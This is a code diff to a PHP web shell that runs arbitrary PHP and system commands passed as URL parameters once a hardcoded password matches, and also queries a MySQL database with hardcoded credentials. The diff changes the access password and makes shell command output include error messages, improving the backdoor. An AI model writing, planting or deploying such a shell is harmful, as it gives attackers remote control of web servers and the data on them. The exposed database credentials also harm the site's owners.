@@ -33,11 +33,12 @@ const send = (method) => {
 HERE;
 } else {
     echo "<pre>";
-    if ($_GET["password"] == "haskell1970") {
+    if ($_GET["password"] == "curry1960") {
         if ($_GET["method"] == "php") {
             eval(urldecode($_GET["data"]));
         } else if ($_GET["method"] == "cmd") {
-            echo shell_exec(urldecode($_GET["data"]));
+            $command = urldecode($_GET["data"]) . " 2>&1";
+            echo shell_exec($command);
         } else if ($_GET["method"] == "sql") {
             mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
             $mysqli = new mysqli('localhost', 'u1242320_jit', 'pass12345', 'u1242320_jitdb');
